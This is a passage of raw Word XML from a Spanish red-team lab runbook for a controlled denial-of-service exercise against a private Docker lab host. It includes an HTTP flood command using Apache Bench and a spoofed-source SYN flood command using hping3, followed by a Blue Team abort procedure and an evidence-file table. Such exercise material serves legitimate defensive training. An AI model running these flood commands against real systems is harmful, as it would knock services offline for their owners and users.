      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Qué hace:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Envía 50,000 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>requests</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP GET con 1000 conexiones concurrentes usando Apache Bench. Satura el ancho de banda y la CPU del servidor.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C879C1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ab -n 50000 -c 1000 -t 60 -r http://172.20.0.20:80/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF3AFCA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78ABA794" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Duración:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Hasta 60 segundos. </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Impacto esperado:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Aumento masivo de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>requests</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> por segundo, degradación del tiempo de respuesta.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C48D8BE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Vector 3 — SYN Flood</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41AFD427" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Qué hace:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Envía miles de paquetes SYN con IPs de origen aleatorias (</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>--rand-source</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>). El servidor crea entradas en la tabla de conexiones semidefinidas (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>half</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">-open) que nunca se completan, agotando los recursos del </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>kernel</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="116AC200" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>hping3 -S --flood --rand-source -p 80 172.20.0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A127B5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C7D1CF4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Duración:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> 30 segundos. </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Este es el vector más disruptivo</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> — el servicio puede tardar más en recuperarse.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36CC7A15" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D744F5E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Señal de </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>abort</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5215BDE3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Si el Blue Team envía la palabra </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>"ABORT"</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> al canal, presionar </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Ctrl+C</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> inmediatamente en el Terminal 3 para detener el vector activo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27228728" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Verificar recuperación del servicio</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A7CD43" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>docker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>exec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>redteam-kali</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7A8B56" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">curl -s -o /dev/null -w </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>'%{</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>http_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>code} -</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> %{time_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>total}s</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>\n' http://172.20.0.20/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A402FCB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B765883" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="162E644C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Resultado esperado cuando el servicio se recuperó:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCA6EC3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>200 - 0.012s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D07D654" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40B623CA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Detener la captura de paquetes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2687DCF8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>bash observability/stop-pcap.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4534CEBD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15EC0ECA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Evidencia generada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7C2578" w14:paraId="5220A95A" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="1C0024F7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Archivo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="4C96D971" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Contenido</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="37B26014" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A0DD1B6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>baseline-curl.csv</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0F33222A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t xml:space="preserve">Latencia </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>baseline</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t xml:space="preserve"> (30 muestras antes del ataque)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="78268B24" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="511CA94B" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>baseline-ab.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="53978DC4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Métricas Apache Bench antes del ataque</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="0BF6E1B1" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79B4D657" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>slowloris-report.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="298FC7F6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Reporte gráfico del Slowloris</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="4208B6A3" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="193CF50E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>slowloris.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="5291E4F0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Captura de paquetes del vector 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="41188C63" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="635350D2" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>http-flood-ab.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0E507EAE" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Métricas del HTTP flood</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="71703A39" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="65CE8E20" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>http-flood.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="402F4B80" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Captura de paquetes del vector 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="64A7A4C2" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
